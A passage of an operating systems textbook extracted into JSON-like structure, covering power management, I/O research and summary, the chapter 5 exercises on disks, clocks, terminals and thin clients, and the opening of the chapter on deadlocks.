mobile computer send a mes\u0002sage to the base station when it is about to turn off the radio. From that time on, the\r\nbase station buffers incoming messages on its disk. The mobile computer may in\u0002dicate explicitly how long it is planning to sleep, or simply inform the base station\n424 INPUT/OUTPUT CHAP. 5\r\nwhen it switches on the radio again. At that point any accumulated messages can\r\nbe sent to it.\r\nOutgoing messages that are generated while the radio is off are buffered on the\r\nmobile computer. If the buffer threatens to fill up, the radio is turned on and the\r\nqueue transmitted to the base station.\r\nWhen should the radio be switched off? One possibility is to let the user or the\r\napplication program decide. Another is to turn it off after some number of seconds\r\nof idle time. When should it be switched on again? Again, the user or program\r\ncould decide, or it could be switched on periodically to check for inbound traffic\r\nand transmit any queued messages. Of course, it also should be switched on when\r\nthe output buffer is close to full. Various other heuristics are possible.\r\nAn example of a wireless technology supporting such a power-management\r\nscheme can be found in 802.11 (‘‘WiFi’’) networks. In 802.11, a mobile computer\r\ncan notify the access point that it is going to sleep but it will wake up before the\r\nbase station sends the next beacon frame. The access point sends out these frames\r\nperiodically. At that point the access point can tell the mobile computer that it has\r\ndata pending. If there is no such data, the mobile computer can sleep again until\r\nthe next beacon frame.\r\nThermal Management\r\nA somewhat different, but still energy-related issue, is thermal management.\r\nModern CPUs get extremely hot due to their high speed. Desktop machines nor\u0002mally have an internal electric fan to blow the hot air out of the chassis. Since\r\nreducing power consumption is usually not a driving issue with desktop machines,\r\nthe fan is usually on all the time.\r\nWith notebooks, the situation is different. The operating system has to monitor\r\nthe temperature continuously. When it gets close to the maximum allowable tem\u0002perature, the operating system has a choice. It can switch on the fan, which makes\r\nnoise and consumes power. Alternatively, it can reduce power consumption by\r\nreducing the backlighting of the screen, slowing down the CPU, being more\r\naggressive about spinning down the disk, and so on.\r\nSome input from the user may be valuable as a guide. For example, a user\r\ncould specify in advance that the noise of the fan is objectionable, so the operating\r\nsystem would reduce power consumption instead.\r\nBattery Management\r\nIn ye olde days, a battery just provided current until it was fully drained, at\r\nwhich time it stopped. Not any more. Mobile devices now use smart batteries now,\r\nwhich can communicate with the operating system. Upon request from the operat\u0002ing system, they can report on things like their maximum voltage, current voltage,\r\nmaximum charge, current charge, maximum drain rate, current drain rate, and\nSEC. 5.8 POWER MANAGEMENT 425\r\nmore. Most mobile devices have programs that can be run to query and display all\r\nthese parameters. Smart batteries can also be instructed to change various opera\u0002tional parameters under control of the operating system.\r\nSome notebooks have multiple batteries. When the operating system detects\r\nthat one battery is about to go, it has to arrange for a graceful cutover to the next\r\none, without causing any glitches during the transition. When the final battery is on\r\nits last legs, it is up to the operating system to warn the user and then cause an\r\norderly shutdown, for example, making sure that the file system is not corrupted.\r\nDriver Interface\r\nSeveral operating systems have an elaborate mechanism for doing power man\u0002agement called ACPI (Advanced Configuration and Power Interface). The op\u0002erating system can send any conformant driver commands asking it to report on the\r\ncapabilities of its devices and their current states. This feature is especially impor\u0002tant when combined with plug and play because just after it is booted, the operat\u0002ing system does not even know what devices are present, let alone their properties\r\nwith respect to energy consumption or power manageability.\r\nIt can also send commands to drivers instructing them to cut their power levels\r\n(based on the capabilities that it learned earlier, of course). There is also some traf\u0002fic the other way. In particular, when a device such as a keyboard or a mouse\r\ndetects activity after a period of idleness, this is a signal to the system to go back to\r\n(near) normal operation."
          },
          "5.8.3 Application Program Issues": {
            "page": 456,
            "content": "5.8.3 Application Program Issues\r\nSo far we have looked at ways the operating system can reduce energy usage\r\nby various kinds of devices. But there is another approach as well: tell the pro\u0002grams to use less energy, even if this means providing a poorer user experience\r\n(better a poorer experience than no experience when the battery dies and the lights\r\ngo out). Typically, this information is passed on when the battery charge is below\r\nsome threshold. It is then up to the programs to decide between degrading perfor\u0002mance to lengthen battery life or to maintain performance and risk running out of\r\nenergy.\r\nOne question that comes up here asks how a program can degrade its perfor\u0002mance to save energy. This question has been studied by Flinn and Satya\u0002narayanan (2004). They provided four examples of how degraded performance\r\ncan save energy. We will now look at these.\r\nIn this study, information is presented to the user in various forms. When no\r\ndegradation is present, the best possible information is presented. When degrada\u0002tion is present, the fidelity (accuracy) of the information presented to the user is\r\nworse than what it could have been. We will see examples of this shortly.\n426 INPUT/OUTPUT CHAP. 5\r\nIn order to measure the energy usage, Flinn and Satyanarayanan devised a soft\u0002ware tool called PowerScope. What it does is provide a power-usage profile of a\r\nprogram. To use it, a computer must be hooked up to an external power supply\r\nthrough a software-controlled digital multimeter. Using the multimeter, software is\r\nable to read out the number of milliamperes coming in from the power supply and\r\nthus determine the instantaneous power being consumed by the computer. What\r\nPowerScope does is periodically sample the program counter and the power usage\r\nand write these data to a file. After the program has terminated, the file is analyzed\r\nto give the energy usage of each procedure. These measurements formed the basis\r\nof their observations. Hardware energy-saving measures were also used and\r\nformed the baseline against which the degraded performance was measured.\r\nThe first program measured was a video player. In undegraded mode, it plays\r\n30 frames/sec in full resolution and in color. One form of degradation is to aban\u0002don the color information and display the video in black and white. Another form\r\nof degradation is to reduce the frame rate, which leads to flicker and gives the\r\nmovie a jerky quality. Still another form of degradation is to reduce the number of\r\npixels in both directions, either by lowering the spatial resolution or making the\r\ndisplayed image smaller. Measures of this type saved about 30% of the energy.\r\nThe second program was a speech recognizer. It sampled the microphone to\r\nconstruct a wav eform. This waveform could either be analyzed on the notebook\r\ncomputer or be sent over a radio link for analysis on a fixed computer. Doing this\r\nsaves CPU energy but uses energy for the radio. Degradation was accomplished by\r\nusing a smaller vocabulary and a simpler acoustic model. The win here was about\r\n35%.\r\nThe next example was a map viewer that fetched the map over the radio link.\r\nDegradation consisted of either cropping the map to smaller dimensions or telling\r\nthe remote server to omit smaller roads, thus requiring fewer bits to be transmitted.\r\nAgain here a gain of about 35% was achieved.\r\nThe fourth experiment was with transmission of JPEG images to a Web brow\u0002ser. The JPEG standard allows various algorithms, trading image quality against\r\nfile size. Here the gain averaged only 9%. Still, all in all, the experiments showed\r\nthat by accepting some quality degradation, the user can run longer on a given bat\u0002tery."
          }
        }
      },
      "5.9 RESEARCH ON INPUT/OUTPUT": {
        "page": 457,
        "content": "5.9 RESEARCH ON INPUT/OUTPUT\r\nThere is a fair amount of research on input/output. Some of it is focused on\r\nspecific devices, rather than I/O in general. Other work focuses on the entire I/O\r\ninfrastructure. For instance, the Streamline architecture aims to provide applica\u0002tion-tailored I/O that minimizes overhead due to copying, context switching, sig\u0002naling and poor use of the cache and TLB (DeBruijn et al., 2011). It builds on the\r\nnotion of Beltway Buffers, advanced circular buffers that are more efficient than\nSEC. 5.9 RESEARCH ON INPUT/OUTPUT 427\r\nexisting buffering systems (DeBruijn and Bos, 2008). Streamline is especially use\u0002ful for demanding network applications. Megapipe (Han et al., 2012) is another\r\nnetwork I/O architecture for message-oriented workloads. It creates per-core bidi\u0002rectional channels between the kernel and user space, on which the systems layers\r\nabstractions like lightweight sockets. The sockets are not quite POSIX-compliant,\r\nso applications need to be adapted to benefit from the more efficient I/O.\r\nOften, the goal of the research is to improve performance of a specific device\r\nin one way or another. Disk systems are a case in point. Disk-arm scheduling algo\u0002rithms are an ever-popular research area. Sometimes the focus is on improved\r\npeformance (Gonzalez-Ferez et al., 2012; Prabhakar et al., 2013; and Zhang et al.,\r\n2012b) but sometimes it is on lower energy usage (Krish et al., 2013; Nijim et al.,\r\n2013; and Zhang et al., 2012a). With the popularity of server consolidation using\r\nvirtual machines, disk scheduling for virtualized systems has become a hot topic\r\n(Jin et al., 2013; and Ling et al., 2012).\r\nNot all topics are new though. That old standby, RAID, still gets plenty of\r\nattention (Chen et al., 2013; Moon and Reddy; 2013; and Timcenko and Djordje\u0002vic, 2013) as do SSDs (Dayan et al., 2013; Kim et al., 2013; and Luo et al., 2013).\r\nOn the theoretical front, some researchers are looking at modeling disk systems in\r\norder to better understand their performance under different workloads (Li et al.,\r\n2013b; and Shen and Qi, 2013).\r\nDisks are not the only I/O device in the spotlight. Another key research area\r\nrelating to I/O is networking. Topics include energy usage (Hewage and Voigt,\r\n2013; and Hoque et al., 2013), networks for data centers (Haitjema, 2013; Liu et\r\nal., 2103; and Sun et al., 2013), quality of service (Gupta, 2013; Hemkumar and\r\nVinaykumar, 2012; and Lai and Tang, 2013), and performance (Han et al., 2012;\r\nand Soorty, 2012).\r\nGiven the large number of computer scientists with notebook computers and\r\ngiven the microscopic battery lifetime on most of them, it should come as no sur\u0002prise that there is tremendous interest in using software techniques to reduce power\r\nconsumption. Among the specialized topics being looked at are balancing the clock\r\nspeed on different cores to achieve sufficient performance without wasting power\r\n(Hruby 2013), energy usage and quality of service (Holmbacka et al., 2013), esti\u0002mating energy usage in real time (Dutta et al., 2013), providing OS services to\r\nmanage energy usage (Weissel, 2012) examining the energy cost of security (Kabri\r\nand Seret, 2009), and scheduling for multimedia (Wei et al., 2010).\r\nNot everyone is interested in notebooks, though. Some computer scientists\r\nthink big and want to save meg awatts at data centers (Fetzer and Knauth, 2012;\r\nSchwartz et al., 2012; Wang et al., 2013b; and Yuan et al., 2012).\r\nAt the other end of the spectrum, a very hot topic is energy use in sensor net\u0002works (Albath et al., 2013; Mikhaylov and Tervonen, 2013; Rasaneh and Baniro\u0002stam, 2013; and Severini et al., 2012).\r\nSomewhat surprisingly, even the lowly clock is still a subject of research. To\r\nprovide good resolution, some operating systems run the clock at 1000 Hz, which\n428 INPUT/OUTPUT CHAP. 5\r\nleads to substantial overhead. Getting rid of this overhead is where the research\r\ncomes in (Tsafir et al., 2005).\r\nSimilarly, interrupt latency is still a concern for research groups, especially in\r\nthe area of real-time operating systems. Since these are often found embedded in\r\ncritical systems (like controls of brake and steering systems), permitting interrupts\r\nonly at very specific preemption points enables the system to control the possible\r\ninterleavings and permits the use of formal verification to improve dependability\r\n(Blackham et al., 2012).\r\nDevice drivers are also still a very active research area. Many operating system\r\ncrashes are caused by buggy device drivers. In Symdrive, the authors present a\r\nframework to test device drivers without actually talking to devices (Renzelmann\r\net al., 2012). As an alternative approach, Rhyzik et al. (2009) show how device\r\ndrivers can be constructed automatically from specifications, with fewer chances of\r\nbugs.\r\nThin clients are also a topic of interest, especially mobile devices connected to\r\nthe cloud (Hocking, 2011; and Tuan-Anh et al., 2013). Finally, there are some\r\npapers on unusual topics such as buildings as big I/O devices (Dawson-Haggerty et\r\nal., 2013)."
      },
      "5.10 SUMMARY": {
        "page": 459,
        "content": "5.10 SUMMARY\r\nInput/output is an often neglected, but important, topic. A substantial fraction\r\nof any operating system is concerned with I/O. I/O can be accomplished in one of\r\nthree ways. First, there is programmed I/O, in which the main CPU inputs or out\u0002puts each byte or word and sits in a tight loop waiting until it can get or send the\r\nnext one. Second, there is interrupt-driven I/O, in which the CPU starts an I/O\r\ntransfer for a character or word and goes off to do something else until an interrupt\r\narrives signaling completion of the I/O. Third, there is DMA, in which a separate\r\nchip manages the complete transfer of a block of data, given an interrupt only\r\nwhen the entire block has been transferred.\r\nI/O can be structured in four levels: the interrupt-service procedures, the device\r\ndrivers, the device-independent I/O software, and the I/O libraries and spoolers that\r\nrun in user space. The device drivers handle the details of running the devices and\r\nproviding uniform interfaces to the rest of the operating system. The device-inde\u0002pendent I/O software does things like buffering and error reporting.\r\nDisks come in a variety of types, including magnetic disks, RAIDs, flash\r\ndrives, and optical disks. On rotating disks, disk arm scheduling algorithms can\r\noften be used to improve disk performance, but the presence of virtual geometries\r\ncomplicates matters. By pairing two disks, a stable storage medium with certain\r\nuseful properties can be constructed.\r\nClocks are used for keeping track of the real time, limiting how long processes\r\ncan run, handling watchdog timers, and doing accounting.\nSEC. 5.10 SUMMARY 429\r\nCharacter-oriented terminals have a variety of issues concerning special char\u0002acters that can be input and special escape sequences that can be output. Input can\r\nbe in raw mode or cooked mode, depending on how much control the program\r\nwants over the input. Escape sequences on output control cursor movement and\r\nallow for inserting and deleting text on the screen.\r\nMost UNIX systems use the X Window System as the basis of the user inter\u0002face. It consists of programs that are bound to special libraries that issue drawing\r\ncommands and an X server that writes on the display.\r\nMany personal computers use GUIs for their output. These are based on the\r\nWIMP paradigm: windows, icons, menus, and a pointing device. GUI-based pro\u0002grams are generally event driven, with keyboard, mouse, and other events being\r\nsent to the program for processing as soon as they happen. In UNIX systems, the\r\nGUIs almost always run on top of X.\r\nThin clients have some advantages over standard PCs, notably simplicity and\r\nless maintenance for users.\r\nFinally, power management is a major issue for phones, tablets, and notebooks\r\nbecause battery lifetimes are limited and for desktop and server machines because\r\nof an organization’s energy bills. Various techniques can be employed by the oper\u0002ating system to reduce power consumption. Programs can also help out by sacrific\u0002ing some quality for longer battery lifetimes.\r\nPROBLEMS\r\n1. Advances in chip technology have made it possible to put an entire controller, includ\u0002ing all the bus access logic, on an inexpensive chip. How does that affect the model of\r\nFig. 1-6?\r\n2. Given the speeds listed in Fig. 5-1, is it possible to scan documents from a scanner and\r\ntransmit them over an 802.11g network at full speed? Defend your answer.\r\n3. Figure 5-3(b) shows one way of having memory-mapped I/O even in the presence of\r\nseparate buses for memory and I/O devices, namely, to first try the memory bus and if\r\nthat fails try the I/O bus. A clever computer science student has thought of an im\u0002provement on this idea: try both in parallel, to speed up the process of accessing I/O\r\ndevices. What do you think of this idea?\r\n4. Explain the tradeoffs between precise and imprecise interrupts on a superscalar\r\nmachine.\r\n5. A DMA controller has fiv e channels. The controller is capable of requesting a 32-bit\r\nword every 40 nsec. A response takes equally long. How fast does the bus have to be\r\nto avoid being a bottleneck?\r\n6. Suppose that a system uses DMA for data transfer from disk controller to main memo\u0002ry. Further assume that it takes t1 nsec on average to acquire the bus and t2 nsec to\r\ntransfer one word over the bus (t1 >> t2). After the CPU has programmed the DMA\n430 INPUT/OUTPUT CHAP. 5\r\ncontroller, how long will it take to transfer 1000 words from the disk controller to main\r\nmemory, if (a) word-at-a-time mode is used, (b) burst mode is used? Assume that com\u0002manding the disk controller requires acquiring the bus to send one word and acknowl\u0002edging a transfer also requires acquiring the bus to send one word.\r\n7. One mode that some DMA controllers use is to have the device controller send the\r\nword to the DMA controller, which then issues a second bus request to write to mem\u0002ory. How can this mode be used to perform memory to memory copy? Discuss any\r\nadvantage or disadvantage of using this method instead of using the CPU to perform\r\nmemory to memory copy.\r\n8. Suppose that a computer can read or write a memory word in 5 nsec. Also suppose that\r\nwhen an interrupt occurs, all 32 CPU registers, plus the program counter and PSW are\r\npushed onto the stack. What is the maximum number of interrupts per second this ma\u0002chine can process?\r\n9. CPU architects know that operating system writers hate imprecise interrupts. One way\r\nto please the OS folks is for the CPU to stop issuing new instructions when an interrupt\r\nis signaled, but allow all the instructions currently being executed to finish, then force\r\nthe interrupt. Does this approach have any disadvantages? Explain your answer.\r\n10. In Fig. 5-9(b), the interrupt is not acknowledged until after the next character has been\r\noutput to the printer. Could it have equally well been acknowledged right at the start of\r\nthe interrupt service procedure? If so, give one reason for doing it at the end, as in the\r\ntext. If not, why not?\r\n11. A computer has a three-stage pipeline as shown in Fig. 1-7(a). On each clock cycle,\r\none new instruction is fetched from memory at the address pointed to by the PC and\r\nput into the pipeline and the PC advanced. Each instruction occupies exactly one mem\u0002ory word. The instructions already in the pipeline are each advanced one stage. When\r\nan interrupt occurs, the current PC is pushed onto the stack, and the PC is set to the ad\u0002dress of the interrupt handler. Then the pipeline is shifted right one stage and the first\r\ninstruction of the interrupt handler is fetched into the pipeline. Does this machine have\r\nprecise interrupts? Defend your answer.\r\n12. A typical printed page of text contains 50 lines of 80 characters each. Imagine that a\r\ncertain printer can print 6 pages per minute and that the time to write a character to the\r\nprinter’s output register is so short it can be ignored. Does it make sense to run this\r\nprinter using interrupt-driven I/O if each character printed requires an interrupt that\r\ntakes 50 μsec all-in to service?\r\n13. Explain how an OS can facilitate installation of a new device without any need for\r\nrecompiling the OS.\r\n14. In which of the four I/O software layers is each of the following done.\r\n(a) Computing the track, sector, and head for a disk read.\r\n(b) Writing commands to the device registers.\r\n(c) Checking to see if the user is permitted to use the device.\r\n(d) Converting binary integers to ASCII for printing.\r\n15. A local area network is used as follows. The user issues a system call to write data\r\npackets to the network. The operating system then copies the data to a kernel buffer.\nCHAP. 5 PROBLEMS 431\r\nThen it copies the data to the network controller board. When all the bytes are safely\r\ninside the controller, they are sent over the network at a rate of 10 megabits/sec. The\r\nreceiving network controller stores each bit a microsecond after it is sent. When the\r\nlast bit arrives, the destination CPU is interrupted, and the kernel copies the newly arri\u0002ved packet to a kernel buffer to inspect it. Once it has figured out which user the packet\r\nis for, the kernel copies the data to the user space. If we assume that each interrupt and\r\nits associated processing takes 1 msec, that packets are 1024 bytes (ignore the head\u0002ers), and that copying a byte takes 1 μsec, what is the maximum rate at which one\r\nprocess can pump data to another? Assume that the sender is blocked until the work is\r\nfinished at the receiving side and an acknowledgement comes back. For simplicity, as\u0002sume that the time to get the acknowledgement back is so small it can be ignored.\r\n16. Why are output files for the printer normally spooled on disk before being printed?\r\n17. How much cylinder skew is needed for a 7200-RPM disk with a track-to-track seek\r\ntime of 1 msec? The disk has 200 sectors of 512 bytes each on each track.\r\n18. A disk rotates at 7200 RPM. It has 500 sectors of 512 bytes around the outer cylinder.\r\nHow long does it take to read a sector?\r\n19. Calculate the maximum data rate in bytes/sec for the disk described in the previous\r\nproblem.\r\n20. RAID level 3 is able to correct single-bit errors using only one parity drive. What is the\r\npoint of RAID level 2? After all, it also can only correct one error and takes more\r\ndrives to do so.\r\n21. A RAID can fail if two or more of its drives crash within a short time interval. Suppose\r\nthat the probability of one drive crashing in a given hour is p. What is the probability\r\nof a k-drive RAID failing in a given hour?\r\n22. Compare RAID level 0 through 5 with respect to read performance, write performance,\r\nspace overhead, and reliability.\r\n23. How many pebibytes are there in a zebibyte?\r\n24. Why are optical storage devices inherently capable of higher data density than mag\u0002netic storage devices? Note: This problem requires some knowledge of high-school\r\nphysics and how magnetic fields are generated.\r\n25. What are the advantages and disadvantages of optical disks versus magnetic disks?\r\n26. If a disk controller writes the bytes it receives from the disk to memory as fast as it re\u0002ceives them, with no internal buffering, is interleaving conceivably useful? Discuss\r\nyour answer.\r\n27. If a disk has double interleaving, does it also need cylinder skew in order to avoid\r\nmissing data when making a track-to-track seek? Discuss your answer.\r\n28. Consider a magnetic disk consisting of 16 heads and 400 cylinders. This disk has four\r\n100-cylinder zones with the cylinders in different zones containing 160, 200, 240. and\r\n280 sectors, respectively. Assume that each sector contains 512 bytes, average seek\r\ntime between adjacent cylinders is 1 msec, and the disk rotates at 7200 RPM. Calcu\u0002late the (a) disk capacity, (b) optimal track skew, and (c) maximum data transfer rate.\n432 INPUT/OUTPUT CHAP. 5\r\n29. A disk manufacturer has two 5.25-inch disks that each have 10,000 cylinders. The\r\nnewer one has double the linear recording density of the older one. Which disk proper\u0002ties are better on the newer drive and which are the same? Are any worse on the newer\r\none?\r\n30. A computer manufacturer decides to redesign the partition table of a Pentium hard disk\r\nto provide more than four partitions. What are some consequences of this change?\r\n31. Disk requests come in to the disk driver for cylinders 10, 22, 20, 2, 40, 6, and 38, in\r\nthat order. A seek takes 6 msec per cylinder. How much seek time is needed for\r\n(a) First-come, first served.\r\n(b) Closest cylinder next.\r\n(c) Elevator algorithm (initially moving upward).\r\nIn all cases, the arm is initially at cylinder 20.\r\n32. A slight modification of the elevator algorithm for scheduling disk requests is to al\u0002ways scan in the same direction. In what respect is this modified algorithm better than\r\nthe elevator algorithm?\r\n33. A personal computer salesman visiting a university in South-West Amsterdam remark\u0002ed during his sales pitch that his company had devoted substantial effort to making\r\ntheir version of UNIX very fast. As an example, he noted that their disk driver used\r\nthe elevator algorithm and also queued multiple requests within a cylinder in sector\r\norder. A student, Harry Hacker, was impressed and bought one. He took it home and\r\nwrote a program to randomly read 10,000 blocks spread across the disk. To his amaze\u0002ment, the performance that he measured was identical to what would be expected from\r\nfirst-come, first-served. Was the salesman lying?\r\n34. In the discussion of stable storage using nonvolatile RAM, the following point was\r\nglossed over. What happens if the stable write completes but a crash occurs before the\r\noperating system can write an invalid block number in the nonvolatile RAM? Does\r\nthis race condition ruin the abstraction of stable storage? Explain your answer.\r\n35. In the discussion on stable storage, it was shown that the disk can be recovered to a\r\nconsistent state (a write either completes or does not take place at all) if a CPU crash\r\noccurs during a write. Does this property hold if the CPU crashes again during a recov\u0002ery procedure. Explain your answer.\r\n36. In the discussion on stable storage, a key assumption is that a CPU crash that corrupts\r\na sector leads to an incorrect ECC. What problems might arise in the fiv e crash-recov\u0002ery scenarios shown in Figure 5-27 if this assumption does not hold?\r\n37. The clock interrupt handler on a certain computer requires 2 msec (including process\r\nswitching overhead) per clock tick. The clock runs at 60 Hz. What fraction of the CPU\r\nis devoted to the clock?\r\n38. A computer uses a programmable clock in square-wav e mode. If a 500 MHz crystal is\r\nused, what should be the value of the holding register to achieve a clock resolution of\r\n(a) a millisecond (a clock tick once every millisecond)?\r\n(b) 100 microseconds?\nCHAP. 5 PROBLEMS 433\r\n39. A system simulates multiple clocks by chaining all pending clock requests together as\r\nshown in Fig. 5-30. Suppose the current time is 5000 and there are pending clock re\u0002quests for time 5008, 5012, 5015, 5029, and 5037. Show the values of Clock header,\r\nCurrent time, and Next signal at times 5000, 5005, and 5013. Suppose a new (pending)\r\nsignal arrives at time 5017 for 5033. Show the values of Clock header, Current time\r\nand Next signal at time 5023.\r\n40. Many versions of UNIX use an unsigned 32-bit integer to keep track of the time as the\r\nnumber of seconds since the origin of time. When will these systems wrap around\r\n(year and month)? Do you expect this to actually happen?\r\n41. A bitmap terminal contains 1600 by 1200 pixels. To scroll a window, the CPU (or\r\ncontroller) must move all the lines of text upward by copying their bits from one part\r\nof the video RAM to another. If a particular window is 80 lines high by 80 characters\r\nwide (6400 characters, total), and a character’s box is 8 pixels wide by 16 pixels high,\r\nhow long does it take to scroll the whole window at a copying rate of 50 nsec per byte?\r\nIf all lines are 80 characters long, what is the equivalent baud rate of the terminal?\r\nPutting a character on the screen takes 5 μsec. How many lines per second can be dis\u0002played?\r\n42. After receiving a DEL (SIGINT) character, the display driver discards all output cur\u0002rently queued for that display. Why?\r\n43. A user at a terminal issues a command to an editor to delete the word on line 5 occupy\u0002ing character positions 7 through and including 12. Assuming the cursor is not on line\r\n5 when the command is given, what ANSI escape sequence should the editor emit to\r\ndelete the word?\r\n44. The designers of a computer system expected that the mouse could be moved at a max\u0002imum rate of 20 cm/sec. If a mickey is 0.1 mm and each mouse message is 3 bytes,\r\nwhat is the maximum data rate of the mouse assuming that each mickey is reported\r\nseparately?\r\n45. The primary additive colors are red, green, and blue, which means that any color can\r\nbe constructed from a linear superposition of these colors. Is it possible that someone\r\ncould have a color photograph that cannot be represented using full 24-bit color?\r\n46. One way to place a character on a bitmapped screen is to use BitBlt from a font table.\r\nAssume that a particular font uses characters that are 16 × 24 pixels in true RGB color.\r\n(a) How much font table space does each character take?\r\n(b) If copying a byte takes 100 nsec, including overhead, what is the output rate to the\r\nscreen in characters/sec?\r\n47. Assuming that it takes 2 nsec to copy a byte, how much time does it take to completely\r\nrewrite the screen of an 80 character × 25 line text mode memory-mapped screen?\r\nWhat about a 1024 × 768 pixel graphics screen with 24-bit color?\r\n48. In Fig. 5-36 there is a class to RegisterClass. In the corresponding X Window code, in\r\nFig. 5-34, there is no such call or anything like it. Why not?\r\n49. In the text we gav e an example of how to draw a rectangle on the screen using the Win\u0002dows GDI:\n434 INPUT/OUTPUT CHAP. 5\r\nRectangle(hdc, xleft, ytop, xright, ybottom);\r\nIs there any real need for the first parameter (hdc), and if so, what? After all, the coor\u0002dinates of the rectangle are explicitly specified as parameters.\r\n50. A thin-client terminal is used to display a Web page containing an animated cartoon of\r\nsize 400 pixels × 160 pixels running at 10 frames/sec. What fraction of a 100-Mbps\r\nFast Ethernet is consumed by displaying the cartoon?\r\n51. It has been observed that a thin-client system works well with a 1-Mbps network in a\r\ntest. Are any problems likely in a multiuser situation? (Hint: Consider a large number\r\nof users watching a scheduled TV show and the same number of users browsing the\r\nWorld Wide Web.)\r\n52. Describe two advantages and two disadvantages of thin client computing?\r\n53. If a CPU’s maximum voltage, V, is cut to V/n, its power consumption drops to 1/n2 of\r\nits original value and its clock speed drops to 1/n of its original value. Suppose that a\r\nuser is typing at 1 char/sec, but the CPU time required to process each character is 100\r\nmsec. What is the optimal value of n and what is the corresponding energy saving in\r\npercent compared to not cutting the voltage? Assume that an idle CPU consumes no\r\nenergy at all.\r\n54. A notebook computer is set up to take maximum advantage of power saving features\r\nincluding shutting down the display and the hard disk after periods of inactivity. A user\r\nsometimes runs UNIX programs in text mode, and at other times uses the X Window\r\nSystem. She is surprised to find that battery life is significantly better when she uses\r\ntext-only programs. Why?\r\n55. Write a program that simulates stable storage. Use two large fixed-length files on your\r\ndisk to simulate the two disks.\r\n56. Write a program to implement the three disk-arm scheduling algorithms. Write a driver\r\nprogram that generates a sequence of cylinder numbers (0–999) at random, runs the\r\nthree algorithms for this sequence and prints out the total distance (number of cylin\u0002ders) the arm needs to traverse in the three algorithms.\r\n57. Write a program to implement multiple timers using a single clock. Input for this pro\u0002gram consists of a sequence of four types of commands (S <int>, T, E <int>, P): S\r\n<int> sets the current time to <int>; T is a clock tick; and E <int> schedules a signal to\r\noccur at time <int>; P prints out the values of Current time, Next signal, and Clock\r\nheader. Your program should also print out a statement whenever it is time to raise a\r\nsignal.\n6\r\nDEADLOCKS\r\nComputer systems are full of resources that can be used only by one process at\r\na time. Common examples include printers, tape drives for backing up company\r\ndata, and slots in the system’s internal tables. Having two processes simultan\u0002eously writing to the printer leads to gibberish. Having two processes using the\r\nsame file-system table slot invariably will lead to a corrupted file system. Conse\u0002quently, all operating systems have the ability to (temporarily) grant a process ex\u0002clusive access to certain resources.\r\nFor many applications, a process needs exclusive access to not one resource,\r\nbut sev eral. Suppose, for example, two processes each want to record a scanned\r\ndocument on a Blu-ray disc. Process A requests permission to use the scanner and\r\nis granted it. Process B is programmed differently and requests the Blu-ray re\u0002corder first and is also granted it. Now A asks for the Blu-ray recorder, but the re\u0002quest is suspended until B releases it. Unfortunately, instead of releasing the Blu\u0002ray recorder, B asks for the scanner. At this point both processes are blocked and\r\nwill remain so forever. This situation is called a deadlock.\r\nDeadlocks can also occur across machines. For example, many off ices have a\r\nlocal area network with many computers connected to it. Often devices such as\r\nscanners, Blu-ray/DVD recorders, printers, and tape drives are connected to the\r\nnetwork as shared resources, available to any user on any machine. If these de\u0002vices can be reserved remotely (i.e., from the user’s home machine), deadlocks of\r\nthe same kind can occur as described above. More complicated situations can\r\ncause deadlocks involving three, four, or more devices and users.\r\n435"
      }
    }
  },
  "6 DEADLOCKS": {
    "page": 466,
    "children": {
      "6.1 RESOURCES": {
        "page": 467,
        "children": {
          "6.1.1 Preemptable and Nonpreemptable Resources": {
            "page": 467,
            "content": "6.1.1 Preemptable and Nonpreemptable Resources\r\nResources come in two types: preemptable and nonpreemptable. A preempt\u0002able resource is one that can be taken away from the process owning it with no ill\r\neffects. Memory is an example of a preemptable resource. Consider, for example,\r\na system with 1 GB of user memory, one printer, and two 1-GB processes that each\r\nwant to print something. Process A requests and gets the printer, then starts to\r\ncompute the values to print. Before it has finished the computation, it exceeds its\r\ntime quantum and is swapped out to disk.\r\nProcess B now runs and tries, unsuccessfully as it turns out, to acquire the\r\nprinter. Potenially, we now hav e a deadlock situation, because A has the printer\r\nand B has the memory, and neither one can proceed without the resource held by\r\nthe other. Fortunately, it is possible to preempt (take away) the memory from B by\nSEC. 6.1 RESOURCES 437\r\nswapping it out and swapping A in. Now A can run, do its printing, and then re\u0002lease the printer. No deadlock occurs.\r\nA nonpreemptable resource, in contrast, is one that cannot be taken away\r\nfrom its current owner without potentially causing failure. If a process has begun\r\nto burn a Blu-ray, suddenly taking the Blu-ray recorder away from it and giving it\r\nto another process will result in a garbled Blu-ray. Blu-ray recorders are not pre\u0002emptable at an arbitrary moment.\r\nWhether a resource is preemptible depends on the context. On a standard PC,\r\nmemory is preemptible because pages can always be swapped out to disk to\r\nrecover it. However, on a smartphone that does not support swapping or paging,\r\ndeadlocks cannot be avoided by just swapping out a memory hog.\r\nIn general, deadlocks involve nonpreemptable resources. Potential deadlocks\r\nthat involve preemptable resources can usually be resolved by reallocating re\u0002sources from one process to another. Thus, our treatment will focus on nonpre\u0002emptable resources.\r\nThe abstract sequence of events required to use a resource is given below.\r\n1. Request the resource.\r\n2. Use the resource.\r\n3. Release the resource.\r\nIf the resource is not available when it is requested, the requesting process is forced\r\nto wait. In some operating systems, the process is automatically blocked when a\r\nresource request fails, and awakened when it becomes available. In other systems,\r\nthe request fails with an error code, and it is up to the calling process to wait a little\r\nwhile and try again.\r\nA process whose resource request has just been denied will normally sit in a\r\ntight loop requesting the resource, then sleeping, then trying again. Although this\r\nprocess is not blocked, for all intents and purposes it is as good as blocked, be\u0002cause it cannot do any useful work. In our further treatment, we will assume that\r\nwhen a process is denied a resource request, it is put to sleep.\r\nThe exact nature of requesting a resource is highly system dependent. In some\r\nsystems, a request system call is provided to allow processes to explicitly ask for\r\nresources. In others, the only resources that the operating system knows about are\r\nspecial files that only one process can have open at a time. These are opened by\r\nthe usual open call. If the file is already in use, the caller is blocked until its cur\u0002rent owner closes it."
          },
          "6.1.2 Resource Acquisition": {
            "page": 468,
